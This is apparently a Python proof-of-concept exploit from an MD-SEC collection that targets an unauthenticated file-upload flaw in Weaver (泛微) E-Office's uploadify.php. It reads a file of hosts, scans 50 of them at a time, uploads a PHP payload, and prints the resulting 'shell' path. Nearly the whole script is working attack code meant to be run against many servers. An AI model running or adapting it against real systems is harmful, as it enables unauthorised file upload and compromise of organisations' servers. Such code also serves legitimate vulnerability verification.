#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# product="泛微-EOffice"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
    print(
        '+ EXP: python3 Fanwei_Oa_Eoffice_Uploadify_Upload_File_Poc.py url.txt                                               +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8081'
}  
def exp(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Content-Type": "multipart/form-data;multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85",
        "Host": "%s" %host2
    }
    headers2 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Host": "%s" %host2
    }
    data ='--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85\r\nContent-Disposition: form-data; name="Filedata"; filename="test.txt"\r\nContent-Type: application/octet-stream\r\n\r\n<?php phpinfo();?>\r\n\r\n--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--\r\n--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85\r\nContent-Disposition: form-data; name="file"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--'
    vulurl = url + "/inc/jquery/uploadify/uploadify.php"
    try:
        
        r = requests.post(vulurl, headers=headers,data=data)
        if r.status_code==200 and len(r.text)>5 and len(r.text) < 20:
            print("shell地址为： "+url+'/attachment/'+r.text+"/test.txt")
            #r2=requests.get(vulurl2,headers=headers2)
            #if r2.status_code==200 and "MDSEC" in r2.text:
               # print(url+" :true")
            #print("http://"+host+":true 文件地址为："+"")
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])